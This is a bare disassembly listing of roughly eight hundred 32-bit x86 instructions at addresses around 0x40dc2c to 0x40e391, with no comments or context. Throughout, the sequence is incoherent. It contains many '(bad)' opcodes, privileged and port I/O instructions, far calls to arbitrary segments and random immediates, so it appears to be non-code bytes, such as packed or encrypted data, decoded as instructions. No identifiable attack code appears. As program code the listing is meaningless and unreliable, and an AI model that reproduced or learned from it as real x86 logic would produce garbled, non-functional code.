  40dc2c:	mov    eax,0xb931f914
  40dc31:	daa    
  40dc32:	push   ss
  40dc33:	lods   eax,DWORD PTR ds:[esi]
  40dc34:	enter  0x67ce,0x48
  40dc38:	nop
  40dc39:	xchg   edi,eax
  40dc3a:	mov    DWORD PTR [esi+eax*4],ebp
  40dc3d:	add    edx,DWORD PTR [ebx+eiz*1]
  40dc40:	sbb    al,0x3c
  40dc42:	imul   BYTE PTR [eax-0x7ce700b5]
  40dc48:	and    al,0xbe
  40dc4a:	shr    BYTE PTR [ebp-0x2f8b0be7],1
  40dc50:	rcr    BYTE PTR [ebp-0x1e06c798],0xa2
  40dc57:	mov    ecx,0xd2748979
  40dc5c:	and    ebp,DWORD PTR [ecx-0x4c]
  40dc5f:	in     eax,0x3c
  40dc61:	mov    cl,dh
  40dc63:	pop    ds
  40dc64:	pop    edi
  40dc65:	ret    
  40dc66:	ficomp DWORD PTR [ecx+0x1067b30c]
  40dc6c:	mov    eax,ds:0x38ef7f3c
  40dc71:	lods   al,BYTE PTR ds:[esi]
  40dc72:	xlat   BYTE PTR ds:[ebx]
  40dc73:	mov    ah,0x6f
  40dc75:	mov    ebx,DWORD PTR [ecx+0xaa7b354]
  40dc7b:	cli    
  40dc7c:	xchg   BYTE PTR [eax-0x6f],al
  40dc7f:	arpl   WORD PTR [ebp+0x31],si
  40dc82:	bound  ecx,QWORD PTR ds:0xe54b4fdc
  40dc88:	inc    ecx
  40dc89:	mov    bl,0x4
  40dc8b:	fdivr  DWORD PTR [eax]
  40dc8d:	rol    dl,cl
  40dc8f:	loop   0x40dc7b
  40dc91:	stos   BYTE PTR es:[edi],al
  40dc92:	(bad)
  40dc96:	mov    dh,ch
  40dc98:	pop    edi
  40dc99:	adc    cl,BYTE PTR [ebx-0xa98e4b1]
  40dc9f:	lods   eax,DWORD PTR ds:[esi]
  40dca0:	out    0xb9,eax
  40dca2:	xchg   esi,eax
  40dca3:	daa    
  40dca4:	mov    bh,0xa
  40dca6:	fidiv  DWORD PTR [ebx+0x72bd4b0c]
  40dcac:	xor    al,0x77
  40dcae:	xor    al,0xcd
  40dcb0:	jecxz  0x40dc7e
  40dcb2:	in     al,0xd3
  40dcb4:	xchg   ebp,eax
  40dcb5:	aas    
  40dcb6:	xor    BYTE PTR [ecx+eiz*2],ah
  40dcb9:	popf   
  40dcba:	scas   eax,DWORD PTR es:[edi]
  40dcbb:	aas    
  40dcbc:	sub    esp,DWORD PTR cs:[esp+edi*2+0x9d91a55]
  40dcc4:	sbb    BYTE PTR [ecx-0x5980bf8],al
  40dcca:	mov    esp,0xc0134aab
  40dccf:	or     eax,0x4a427408
  40dcd4:	enter  0x59d0,0x5c
  40dcd8:	and    BYTE PTR [edi+0x11],bl
  40dcdb:	je     0x40dc5e
  40dcdd:	repz xchg edi,eax
  40dcdf:	dec    edx
  40dce0:	iret   
  40dce1:	cmp    eax,0xe84c279f
  40dce6:	ja     0x40dc92
  40dce8:	inc    eax
  40dce9:	je     0x40dd35
  40dceb:	(bad)  
  40dcec:	jmp    0x25a03e5f
  40dcf1:	xchg   BYTE PTR [ebx+0x47c9205e],ah
  40dcf7:	push   eax
  40dcf8:	sbb    cl,bh
  40dcfa:	loope  0x40dc7c
  40dcfc:	sub    BYTE PTR [edi+0x5c69e246],0xad
  40dd03:	mov    bh,0xc9
  40dd05:	out    0xad,al
  40dd07:	or     ch,dl
  40dd09:	outs   dx,BYTE PTR ds:[esi]
  40dd0a:	scas   eax,DWORD PTR es:[edi]
  40dd0b:	aam    0x86
  40dd0d:	retf   0x4522
  40dd10:	jne    0x40dc96
  40dd12:	cmp    ecx,DWORD PTR [ebx+0xceb94c5]
  40dd18:	sbb    al,0x89
  40dd1a:	clc    
  40dd1b:	(bad)  
  40dd1c:	ins    BYTE PTR es:[edi],dx
  40dd1d:	jb     0x40dd6b
  40dd1f:	fisubr WORD PTR [ebx]
  40dd21:	xor    eax,0x1109e34e
  40dd26:	cdq    
  40dd27:	sbb    ch,BYTE PTR [ecx]
  40dd29:	cmp    BYTE PTR [edi-0x23],cl
  40dd2c:	cmp    al,0xa8
  40dd2e:	mov    ch,0x2e
  40dd30:	adc    al,0xf
  40dd32:	add    ah,dh
  40dd34:	push   0x13
  40dd36:	cmp    bh,BYTE PTR [ebp*8-0x56fd3940]
  40dd3d:	in     al,dx
  40dd3e:	pop    edx
  40dd3f:	xlat   BYTE PTR ds:[ebx]
  40dd40:	cdq    
  40dd41:	mov    al,ds:0x86e37c12
  40dd46:	mov    DWORD PTR [eax],eax
  40dd48:	repz int 0x10
  40dd4b:	es js  0x40dd06
  40dd4e:	adc    ch,cl
  40dd50:	mov    edx,0x71a98159
  40dd55:	fwait
  40dd56:	push   edi
  40dd57:	sbb    DWORD PTR [ecx-0x7c],esp
  40dd5a:	mov    ch,0x34
  40dd5c:	ror    DWORD PTR [ecx],cl
  40dd5e:	rcl    BYTE PTR [edx-0x3f88396d],cl
  40dd64:	push   ecx
  40dd65:	and    esi,DWORD PTR [esi-0x3d]
  40dd68:	mov    bh,0x97
  40dd6a:	popa   
  40dd6b:	int    0xdc
  40dd6d:	shl    BYTE PTR [esi+0x2e9738ad],cl
  40dd73:	sbb    al,0x33
  40dd75:	adc    bl,BYTE PTR [ebx+0x34]
  40dd78:	dec    eax
  40dd79:	stos   BYTE PTR es:[edi],al
  40dd7a:	jo     0x40dd34
  40dd7c:	sub    bh,BYTE PTR [esi+ecx*2+0x63]
  40dd80:	cmp    eax,DWORD PTR [edi-0x6e]
  40dd83:	xchg   ecx,eax
  40dd84:	scas   eax,DWORD PTR es:[edi]
  40dd85:	fdiv   QWORD PTR ds:0xb2644ca1
  40dd8b:	and    esp,DWORD PTR [ecx-0x15009b36]
  40dd91:	pop    ds
  40dd92:	call   0xead2:0x5059756e
  40dd99:	cmp    DWORD PTR [ebp+0x21],eax
  40dd9c:	aam    0xf5
  40dd9e:	pop    es
  40dd9f:	pushf  
  40dda0:	test   BYTE PTR [ebx-0x1276ebfb],bh
  40dda6:	loopne 0x40dd42
  40dda8:	xor    eax,0x10eafa21
  40ddad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddae:	adc    BYTE PTR [esp+ecx*4],cl
  40ddb1:	jge    0x40ddc1
  40ddb3:	push   ebp
  40ddb4:	mov    ah,dl
  40ddb6:	test   eax,0x5b251909
  40ddbb:	pop    ecx
  40ddbc:	or     dl,BYTE PTR [ecx+0x49]
  40ddbf:	outs   dx,BYTE PTR ds:[esi]
  40ddc0:	add    ecx,0x9c129e95
  40ddc6:	fst    DWORD PTR [eax-0x2b]
  40ddc9:	or     ebx,ebp
  40ddcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddcc:	test   al,0xb4
  40ddce:	arpl   WORD PTR [ebx+0x28],bp
  40ddd1:	xor    al,0xeb
  40ddd3:	push   ebp
  40ddd4:	aam    0x2c
  40ddd6:	aaa    
  40ddd7:	xchg   esi,eax
  40ddd8:	add    BYTE PTR [ebx-0x7f364430],dh
  40ddde:	cmp    edi,DWORD PTR [esi+edx*2+0x7c]
  40dde2:	rol    DWORD PTR [ebx+0x6c743538],cl
  40dde8:	shl    ebp,1
  40ddea:	mov    bl,0x87
  40ddec:	lock jae 0x40de59
  40ddef:	call   0x6191:0x37ccba9d
  40ddf6:	sub    edi,esi
  40ddf8:	xchg   edi,eax
  40ddf9:	xchg   edi,eax
  40ddfa:	xor    DWORD PTR [ecx-0x68],0x7d45d07e
  40de01:	out    0x2b,eax
  40de03:	sub    esp,DWORD PTR [ecx]
  40de05:	shl    eax,1
  40de07:	dec    ebx
  40de08:	icebp  
  40de09:	jp     0x40ddb6
  40de0b:	cld    
  40de0c:	aaa    
  40de0d:	aaa    
  40de0e:	mov    ebx,0x23ef2899
  40de13:	ror    esp,1
  40de15:	into   
  40de16:	sbb    DWORD PTR [ebx+0x4],0x79
  40de1a:	nop
  40de1b:	inc    esp
  40de1c:	adc    BYTE PTR [esi-0x18],0xb2
  40de20:	pop    edx
  40de21:	inc    edx
  40de22:	les    ebx,FWORD PTR [edx]
  40de24:	lahf   
  40de25:	jge    0x40ddff
  40de27:	xchg   ebx,eax
  40de28:	and    DWORD PTR [edi],esi
  40de2a:	in     al,dx
  40de2b:	sub    ebx,DWORD PTR [esi-0x1c]
  40de2e:	pop    ecx
  40de2f:	imul   edx,DWORD PTR [ebp-0x682cddf9],0x44
  40de36:	scas   al,BYTE PTR es:[edi]
  40de37:	ins    DWORD PTR es:[edi],dx
  40de38:	div    dl
  40de3a:	sbb    al,BYTE PTR [ebx+0x1883e25c]
  40de40:	pop    ecx
  40de41:	adc    al,0x6c
  40de43:	push   edi
  40de44:	lea    edi,[edx-0xaaa317f]
  40de4a:	(bad)  
  40de4b:	fadd   DWORD PTR [ecx+eax*4+0x2d]
  40de4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de50:	xor    esi,DWORD PTR [ebp-0x21f26060]
  40de56:	push   esi
  40de57:	sbb    DWORD PTR [edi],edi
  40de59:	sbb    BYTE PTR [edx],0x41
  40de5c:	pop    esi
  40de5d:	aaa    
  40de5e:	cmp    al,ah
  40de60:	inc    eax
  40de61:	push   0x7b
  40de63:	cmp    esi,DWORD PTR [ebx-0x4a]
  40de66:	(bad)
  40de6a:	jg     0x40deb3
  40de6c:	scas   eax,DWORD PTR es:[edi]
  40de6d:	fisubr DWORD PTR [edx-0x472bd566]
  40de73:	sar    DWORD PTR [ecx],0x41
  40de76:	stos   DWORD PTR es:[edi],eax
  40de77:	add    bl,BYTE PTR [esi+0x25769bea]
  40de7d:	pop    ecx
  40de7e:	dec    ebp
  40de7f:	mov    eax,0xc4937f2c
  40de84:	icebp  
  40de85:	ins    DWORD PTR es:[edi],dx
  40de86:	arpl   WORD PTR [esi-0x7b],di
  40de89:	xchg   ebp,eax
  40de8a:	and    bl,BYTE PTR [edx+0x4ccbc878]
  40de90:	dec    edi
  40de91:	retf   0x109a
  40de94:	pushf  
  40de95:	ret    
  40de96:	and    dl,dl
  40de98:	xor    edx,DWORD PTR [edi+0x51]
  40de9b:	js     0x40dea5
  40de9d:	or     dl,BYTE PTR [edi+0x596000b]
  40dea3:	mov    ds:0x51f42f1c,eax
  40dea8:	shr    DWORD PTR [ebx-0x31ba62be],cl
  40deae:	push   ecx
  40deaf:	jl     0x40df30
  40deb1:	cmp    eax,0xb87b2a07
  40deb6:	int3   
  40deb7:	pop    ss
  40deb8:	jno    0x40de3f
  40deba:	clc    
  40debb:	sub    al,0x89
  40debd:	mov    bl,0xb2
  40debf:	mov    bh,dh
  40dec1:	jb     0x40def6
  40dec3:	pop    es
  40dec4:	xchg   esi,eax
  40dec5:	js     0x40ded2
  40dec7:	retf   
  40dec8:	aam    0x3e
  40deca:	dec    esp
  40decb:	add    esi,esi
  40decd:	xchg   edi,eax
  40dece:	jo     0x40de65
  40ded0:	mov    edx,0x9a212779
  40ded5:	mov    ecx,0x898eacbe
  40deda:	int    0xa8
  40dedc:	scas   eax,DWORD PTR es:[edi]
  40dedd:	inc    edi
  40dede:	cld    
  40dedf:	outs   dx,BYTE PTR ds:[esi]
  40dee0:	leave  
  40dee1:	rol    BYTE PTR [edx-0x5fce057f],0xa5
  40dee8:	test   al,0x1d
  40deea:	add    cl,bl
  40deec:	ds out dx,eax
  40deee:	sub    eax,0x75e4d22b
  40def3:	outs   dx,DWORD PTR ds:[esi]
  40def4:	mov    cl,0x3
  40def6:	lea    esp,[edi-0x5ce69c23]
  40defc:	pop    esp
  40defd:	fnsave [esi+0x6f667c56]
  40df03:	stos   BYTE PTR es:[edi],al
  40df04:	add    ch,dl
  40df06:	clc    
  40df07:	test   al,0x5
  40df09:	dec    edx
  40df0a:	jo     0x40defd
  40df0c:	repz push 0x46da3335
  40df12:	mov    bh,0xce
  40df14:	xchg   edi,eax
  40df15:	sbb    al,0x15
  40df17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df18:	ret    
  40df19:	push   0x85c21025
  40df1e:	inc    ebx
  40df1f:	fadd   st,st(6)
  40df21:	lock div BYTE PTR [edx]
  40df24:	data16 loop 0x40df3d
  40df27:	std    
  40df28:	adc    bh,BYTE PTR [edx]
  40df2a:	shl    BYTE PTR [edi-0x15b9c7d1],cl
  40df30:	push   ds
  40df31:	jl     0x40dfae
  40df33:	xchg   DWORD PTR [ecx+0x2cbaa29d],edx
  40df39:	pusha  
  40df3a:	js     0x40df4f
  40df3c:	xor    eax,0xf152c62
  40df41:	fisttp QWORD PTR [ecx]
  40df43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df44:	popa   
  40df45:	pop    ebp
  40df46:	inc    eax
  40df47:	cmp    BYTE PTR [edi-0x45977203],cl
  40df4d:	mov    al,ds:0xf7336fe4
  40df52:	pushf  
  40df53:	lods   al,BYTE PTR ds:[esi]
  40df54:	cmp    BYTE PTR [ebp+0x74],0xee
  40df58:	push   0x5a
  40df5a:	inc    ebx
  40df5b:	lea    esi,[edx+0x4b]
  40df5e:	and    bl,BYTE PTR [ecx+ebx*4]
  40df61:	dec    ebx
  40df62:	jo     0x40df00
  40df64:	ins    DWORD PTR es:[edi],dx
  40df65:	mov    esi,0x210e623d
  40df6a:	mov    ch,BYTE PTR [ebp-0x32bb0b2f]
  40df70:	mov    edi,0x994b0d5f
  40df75:	enter  0x42f3,0x8d
  40df79:	push   0x8f2a9ef6
  40df7e:	jbe    0x40df48
  40df80:	lea    ecx,[eax-0x185bb1e4]
  40df86:	div    BYTE PTR [ebx]
  40df88:	adc    BYTE PTR [ebx],0xcc
  40df8b:	popf   
  40df8c:	dec    eax
  40df8d:	fstp   DWORD PTR [edi-0x583bd546]
  40df93:	pop    ss
  40df94:	xchg   DWORD PTR [edx],ecx
  40df96:	jmp    0xaad:0x76950e49
  40df9d:	mov    dh,0x77
  40df9f:	ret    0x2ba7
  40dfa2:	xor    cl,BYTE PTR [edx+0x6fa2d1bd]
  40dfa8:	in     al,0x4
  40dfaa:	test   al,0xcd
  40dfac:	mov    al,0x8b
  40dfae:	ja     0x40df3c
  40dfb0:	(bad)  [eax+ecx*2]
  40dfb3:	xchg   esi,eax
  40dfb4:	sbb    al,0x12
  40dfb6:	das    
  40dfb7:	stc    
  40dfb8:	or     BYTE PTR [esi+edi*1-0x4dc5a3e7],al
  40dfbf:	adc    esi,DWORD PTR [ebx+0xf]
  40dfc2:	jle    0x40df7a
  40dfc4:	pushf  
  40dfc5:	inc    esi
  40dfc6:	jecxz  0x40dfd8
  40dfc8:	test   DWORD PTR [esi],ebp
  40dfca:	shl    DWORD PTR [edi],0x84
  40dfcd:	dec    edi
  40dfce:	data16 jmp 0x40df9b
  40dfd1:	mov    ds:0x43e885a4,eax
  40dfd6:	out    0x14,al
  40dfd8:	(bad)  
  40dfd9:	(bad)  
  40dfda:	in     eax,0x59
  40dfdc:	aas    
  40dfdd:	pop    es
  40dfde:	sub    al,0x8d
  40dfe0:	jp     0x40df64
  40dfe2:	xchg   esi,eax
  40dfe3:	out    0x63,eax
  40dfe5:	js     0x40dfa4
  40dfe7:	popa   
  40dfe8:	mov    ch,BYTE PTR [edi-0x51e7eb]
  40dfee:	mov    esi,0x4a1f9f3d
  40dff3:	lea    ebp,ds:[edx+0x24]
  40dff7:	inc    eax
  40dff8:	sbb    dh,dh
  40dffa:	nop
  40dffb:	or     al,0xd0
  40dffd:	cmp    ebx,DWORD PTR [eax]
  40dfff:	fidivr WORD PTR [ebx-0x40b22cd9]
  40e005:	push   ecx
  40e006:	in     eax,0x3f
  40e008:	push   ebp
  40e009:	xor    DWORD PTR [edi],0xd7f2e45e
  40e00f:	pusha  
  40e010:	xchg   edi,eax
  40e011:	mov    al,ds:0x32dc2081
  40e016:	(bad)  
  40e017:	out    dx,eax
  40e018:	xor    ebx,DWORD PTR [ecx+0x2c]
  40e01b:	bound  ebp,QWORD PTR [ebp-0x4140bb4d]
  40e021:	mov    bl,BYTE PTR [edx-0x59]
  40e024:	shl    ebp,0x48
  40e027:	mov    eax,ds:0x4d61c937
  40e02c:	sub    dl,BYTE PTR [ebx]
  40e02e:	out    dx,eax
  40e02f:	mov    ecx,DWORD PTR [ebx-0x5156a0ed]
  40e035:	mov    ch,0x3e
  40e037:	add    al,BYTE PTR [ecx+eax*8-0x49d53d85]
  40e03e:	jnp    0x40e095
  40e040:	aam    0xda
  40e042:	and    eax,0xbfdb668
  40e047:	ret    0xca98
  40e04a:	xor    edi,DWORD PTR [esp+ebx*2]
  40e04d:	mov    DWORD PTR [ecx],ecx
  40e04f:	sar    BYTE PTR [edx],0x13
  40e052:	push   ss
  40e053:	out    0xf5,al
  40e055:	hlt    
  40e056:	and    dl,BYTE PTR [esp+eax*8]
  40e059:	ja     0x40dfe1
  40e05b:	xor    bl,bl
  40e05d:	fidivr WORD PTR [edi]
  40e05f:	aas    
  40e060:	jbe    0x40e09f
  40e062:	mov    cs,WORD PTR [esi]
  40e064:	lds    esi,FWORD PTR [edi]
  40e066:	xor    BYTE PTR [esi+0x12],0xad
  40e06a:	(bad)  
  40e06b:	int    0x95
  40e06d:	repnz daa 
  40e06f:	scas   eax,DWORD PTR es:[edi]
  40e070:	adc    al,0x75
  40e072:	cdq    
  40e073:	push   ss
  40e074:	in     al,0x99
  40e076:	jg     0x40e0ef
  40e078:	dec    ecx
  40e079:	push   cs
  40e07a:	sub    ah,BYTE PTR [eax+0x4abb0fc7]
  40e080:	lock pop ebx
  40e082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e083:	call   0xe48b:0xfc95a81f
  40e08a:	std    
  40e08b:	push   ss
  40e08c:	fmul   DWORD PTR [edi-0x6435b5f2]
  40e092:	add    BYTE PTR [ecx-0x7f],bl
  40e095:	push   ss
  40e096:	inc    esi
  40e097:	adc    bl,BYTE PTR [ecx]
  40e099:	mov    cr3,ecx
  40e09c:	dec    ebx
  40e09d:	nop    WORD PTR [ecx-0x7dcfca3a]
  40e0a5:	es mov al,0x2e
  40e0a8:	cld    
  40e0a9:	jmp    0xd0b0f0d9
  40e0ae:	call   0xff1c:0x34d5ecb2
  40e0b5:	stc    
  40e0b6:	addr16 push esi
  40e0b8:	scas   eax,DWORD PTR es:[edi]
  40e0b9:	adc    DWORD PTR [edx-0x3a4f0a13],0x9f70b34c
  40e0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c4:	mov    eax,0x2042f1cf
  40e0c9:	cmc    
  40e0ca:	push   esi
  40e0cb:	pop    ss
  40e0cc:	call   0xe6620a2
  40e0d1:	push   ebp
  40e0d2:	ror    DWORD PTR [ebx-0x2a],0xbc
  40e0d6:	adc    eax,0xe24b371e
  40e0db:	sbb    DWORD PTR [esi-0x49],ecx
  40e0de:	bound  ebp,QWORD PTR [ebx]
  40e0e0:	pop    ds
  40e0e1:	popa   
  40e0e2:	sbb    bl,BYTE PTR [esi]
  40e0e4:	pop    eax
  40e0e5:	adc    dl,0xa0
  40e0e8:	push   0xffffff87
  40e0ea:	or     dl,al
  40e0ec:	and    esp,0x97fc303
  40e0f2:	inc    ebp
  40e0f3:	mov    dl,0x32
  40e0f5:	cmp    ch,cl
  40e0f7:	pushf  
  40e0f8:	aad    0x51
  40e0fa:	push   ds
  40e0fb:	pop    eax
  40e0fc:	(bad)  
  40e0fd:	sub    cl,BYTE PTR [edi-0x5e]
  40e100:	sahf   
  40e101:	sahf   
  40e102:	ror    DWORD PTR [edi-0x2249b71d],1
  40e108:	or     eax,0x3b71ed77
  40e10d:	cwde   
  40e10e:	push   ds
  40e10f:	mov    eax,0xa09b3968
  40e114:	xor    DWORD PTR [ecx+eax*4-0x31b46a75],eax
  40e11b:	repz fistp WORD PTR [eax]
  40e11e:	adc    eax,0xbe2c441f
  40e123:	xlat   BYTE PTR ds:[ebx]
  40e124:	jge    0x40e0b4
  40e126:	(bad)  [ebp+0x26d7a457]
  40e12c:	gs call 0x67e90f7a
  40e132:	stos   BYTE PTR es:[edi],al
  40e133:	dec    ecx
  40e134:	test   DWORD PTR [ecx],edi
  40e136:	sbb    al,0xf4
  40e138:	gs dec esi
  40e13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13b:	scas   eax,DWORD PTR es:[edi]
  40e13c:	fldenv [eax+ebp*4-0x19]
  40e140:	sar    BYTE PTR [edi],0xdb
  40e143:	pop    edx
  40e144:	sbb    al,0xd6
  40e146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e147:	jg     0x40e1ac
  40e149:	test   DWORD PTR [eax+0x7d],eax
  40e14c:	mov    ch,0x5d
  40e14e:	out    dx,al
  40e14f:	hlt    
  40e150:	adc    al,0x75
  40e152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e153:	jl     0x40e1c4
  40e155:	jb     0x40e140
  40e157:	repz add al,0x6a
  40e15a:	sbb    BYTE PTR [ecx],cl
  40e15c:	repz lahf 
  40e15e:	jno    0x40e16a
  40e160:	int3   
  40e161:	lods   eax,DWORD PTR ds:[esi]
  40e162:	iret   
  40e163:	or     eax,0xd051113e
  40e168:	adc    BYTE PTR [ecx],al
  40e16a:	or     DWORD PTR [edi+ecx*2+0x6a121550],edi
  40e171:	lods   al,BYTE PTR ds:[esi]
  40e172:	sub    WORD PTR [ecx+0x25],ax
  40e176:	sub    al,0x14
  40e178:	enter  0x860b,0xb4
  40e17c:	inc    ebp
  40e17d:	ja     0x40e1c8
  40e17f:	push   ebx
  40e180:	inc    esp
  40e181:	(bad)  
  40e182:	into   
  40e183:	fnstcw WORD PTR [ecx]
  40e185:	out    dx,al
  40e186:	daa    
  40e187:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e189:	mov    ah,0x7b
  40e18b:	fisubr DWORD PTR ds:0xdf9c1e47
  40e191:	mov    ch,0x86
  40e193:	pop    ss
  40e194:	call   0x55e3:0x8f7f3b06
  40e19b:	xchg   ecx,eax
  40e19c:	out    0x75,eax
  40e19e:	ror    DWORD PTR ds:0x464a744,cl
  40e1a4:	ja     0x40e1a5
  40e1a6:	xchg   esi,eax
  40e1a7:	cli    
  40e1a8:	mov    ah,0x29
  40e1aa:	mov    DWORD PTR [ecx],edx
  40e1ac:	xor    eax,0xde0854fd
  40e1b1:	aas    
  40e1b2:	jmp    0xbd07266c
  40e1b7:	mov    al,0x52
  40e1b9:	(bad)  
  40e1bb:	push   0x415e6d3
  40e1c0:	add    eax,0xfa89844e
  40e1c5:	in     al,dx
  40e1c6:	ins    BYTE PTR es:[edi],dx
  40e1c7:	out    dx,al
  40e1c8:	out    dx,eax
  40e1c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1ca:	mov    es,WORD PTR [ebx+0x2aad8ef6]
  40e1d0:	lea    ecx,[edx]
  40e1d2:	push   ebp
  40e1d3:	and    ecx,ebp
  40e1d5:	xchg   ecx,eax
  40e1d6:	(bad)  
  40e1d7:	std    
  40e1d8:	popa   
  40e1d9:	ror    BYTE PTR [ebp-0xbc894f9],1
  40e1df:	push   ds
  40e1e0:	xchg   ebp,eax
  40e1e1:	test   ebx,esi
  40e1e3:	pop    ebp
  40e1e4:	adc    dh,ah
  40e1e6:	jae    0x40e24b
  40e1e8:	push   esi
  40e1e9:	pop    edx
  40e1ea:	das    
  40e1eb:	pop    esi
  40e1ec:	int    0x9b
  40e1ee:	adc    eax,0x83a9baba
  40e1f3:	add    edx,DWORD PTR [edi+0x1584dacb]
  40e1f9:	das    
  40e1fa:	in     al,0xcb
  40e1fc:	cli    
  40e1fd:	jbe    0x40e1dc
  40e1ff:	pop    ds
  40e200:	fdiv   QWORD PTR ds:0xd250a94
  40e206:	lea    ebx,[ecx+0x6829f5f9]
  40e20c:	dec    edx
  40e20d:	sar    BYTE PTR [esi-0x33],cl
  40e210:	imul   edx,DWORD PTR [eax+0x39],0xffffffd5
  40e214:	cmp    cl,BYTE PTR [ecx]
  40e216:	ja     0x40e1a7
  40e218:	lods   eax,DWORD PTR ds:[esi]
  40e219:	push   edi
  40e21a:	nop
  40e21b:	ss ins BYTE PTR es:[edi],dx
  40e21d:	(bad)
  40e222:	adc    esi,DWORD PTR [edi]
  40e224:	mov    ebp,DWORD PTR [esi-0x6d]
  40e227:	fs inc esi
  40e229:	pop    es
  40e22a:	out    0xfe,eax
  40e22c:	dec    esi
  40e22d:	pop    ebx
  40e22e:	dec    esp
  40e22f:	mov    ah,0xed
  40e231:	mov    ah,0x64
  40e233:	int    0x9f
  40e235:	inc    edx
  40e236:	shr    DWORD PTR [edi+0x845878c],0xba
  40e23d:	daa    
  40e23e:	push   es
  40e23f:	popa   
  40e240:	jmp    0x40c3:0xde6c87e
  40e247:	inc    esp
  40e248:	cmp    BYTE PTR [edx+0x1],bh
  40e24b:	pop    esi
  40e24c:	ret    0xaa66
  40e24f:	mov    BYTE PTR [eax],cl
  40e251:	mov    dl,0xc1
  40e253:	cmp    BYTE PTR [ecx+eax*4-0x61],dh
  40e257:	xor    ah,bh
  40e259:	inc    esp
  40e25a:	and    ah,BYTE PTR [ebx]
  40e25c:	fwait
  40e25d:	mov    BYTE PTR [edx-0x308ba7de],dl
  40e263:	shr    DWORD PTR [edi+0x68],cl
  40e266:	pop    edx
  40e267:	outs   dx,BYTE PTR ds:[esi]
  40e268:	push   esi
  40e269:	fcomp  st(4)
  40e26b:	(bad)  [ecx-0x58475541]
  40e271:	push   esp
  40e272:	fild   QWORD PTR [edi+0x25fea46c]
  40e278:	jmp    0x32d9:0xc013301c
  40e27f:	div    DWORD PTR [edi+0x5]
  40e282:	sub    ebx,DWORD PTR [ebp+0x20]
  40e285:	call   0x199d669a
  40e28a:	mov    cl,0xb5
  40e28c:	arpl   sp,di
  40e28e:	clc    
  40e28f:	and    esi,eax
  40e291:	xchg   bh,bh
  40e293:	xchg   ecx,eax
  40e294:	adc    DWORD PTR [ecx-0x5b],edx
  40e297:	adc    eax,0x8f2e3fad
  40e29c:	(bad)  
  40e29d:	and    dl,ch
  40e29f:	mov    eax,ds:0x17dcf86e
  40e2a4:	nop
  40e2a5:	out    0xd4,al
  40e2a7:	in     eax,dx
  40e2a8:	xor    eax,0x2a9750b1
  40e2ad:	lahf   
  40e2ae:	or     eax,0xbf96962a
  40e2b3:	ror    DWORD PTR [eax+ebp*8],0x7f
  40e2b7:	pop    esi
  40e2b8:	xchg   ebx,eax
  40e2b9:	ficomp DWORD PTR [ebp-0x64]
  40e2bc:	aam    0x3e
  40e2be:	adc    DWORD PTR [esi-0x6b0136d0],ebp
  40e2c4:	daa    
  40e2c5:	les    esp,FWORD PTR [ebx+0x73d18f6d]
  40e2cb:	add    ch,BYTE PTR [esi+0x38]
  40e2ce:	sbb    DWORD PTR [edi-0x22008268],ecx
  40e2d4:	(bad)  
  40e2d5:	sbb    eax,DWORD PTR [esi+0x4048135d]
  40e2db:	push   es
  40e2dc:	sub    edx,DWORD PTR [ebx+0x30]
  40e2df:	sub    ch,BYTE PTR [edx]
  40e2e1:	mov    esp,0xcbcde8b4
  40e2e6:	stos   DWORD PTR es:[edi],eax
  40e2e7:	lock and eax,0xb953c536
  40e2ed:	xlat   BYTE PTR ds:[ebx]
  40e2ee:	dec    edx
  40e2ef:	data16 mov bl,0xea
  40e2f2:	pop    es
  40e2f3:	int    0xcb
  40e2f5:	cld    
  40e2f6:	ja     0x40e356
  40e2f8:	scas   eax,DWORD PTR es:[edi]
  40e2f9:	adc    edx,eax
  40e2fb:	xchg   ebx,eax
  40e2fc:	mov    ds:0x4320df1b,eax
  40e301:	ret    0xa33d
  40e304:	mov    esp,0x50bdc1db
  40e309:	xchg   esp,eax
  40e30a:	jo     0x40e331
  40e30c:	mov    cl,dh
  40e30e:	outs   dx,DWORD PTR es:[esi]
  40e310:	imul   esi,DWORD PTR [ecx+ebp*1],0xba55ff96
  40e317:	mov    ds:0xe0e5a8d7,al
  40e31c:	dec    ebx
  40e31d:	(bad)  
  40e31e:	jge    0x40e2d4
  40e320:	(bad)
  40e324:	and    ebp,DWORD PTR [ebp+0x3]
  40e327:	ja     0x40e344
  40e329:	mov    ch,0x56
  40e32b:	and    edx,DWORD PTR [edx-0x7e]
  40e32e:	test   ah,ch
  40e330:	push   ss
  40e331:	int3   
  40e332:	xchg   ebx,eax
  40e333:	xchg   ecx,eax
  40e334:	pop    es
  40e335:	mov    bh,BYTE PTR ds:0x3839828f
  40e33b:	sbb    BYTE PTR [edx-0x46294d25],cl
  40e341:	mov    eax,0x2769b6f4
  40e346:	test   DWORD PTR [edi+0x14],edx
  40e349:	push   0x8a65d890
  40e34e:	jns    0x40e2e5
  40e350:	or     bl,BYTE PTR [edi-0x73af48a0]
  40e356:	xchg   edx,eax
  40e357:	push   edx
  40e358:	dec    edx
  40e359:	pop    eax
  40e35a:	adc    ebp,edx
  40e35c:	push   edi
  40e35d:	fistp  QWORD PTR ds:0x271227c
  40e363:	mov    DWORD PTR [edi+ebp*2-0x32],esp
  40e367:	sub    al,BYTE PTR [ecx+ecx*4-0x10]
  40e36b:	stos   DWORD PTR es:[edi],eax
  40e36c:	mov    bl,0x36
  40e36e:	adc    eax,0x28b1f182
  40e373:	pop    ebx
  40e374:	push   es
  40e375:	jns    0x40e3eb
  40e377:	test   al,0x35
  40e379:	pop    es
  40e37a:	adc    esi,DWORD PTR [edi-0x6b77763f]
  40e380:	ins    DWORD PTR es:[edi],dx
  40e381:	rol    BYTE PTR [esi-0x13],cl
  40e384:	retf   0xff84
  40e387:	iret   
  40e388:	mov    edx,ds
  40e38a:	les    edi,FWORD PTR [ebx+0x3e]
  40e38d:	popf   
  40e38e:	xchg   ecx,eax
  40e38f:	jecxz  0x40e400
  40e391:	adc    eax,0xea08fec6
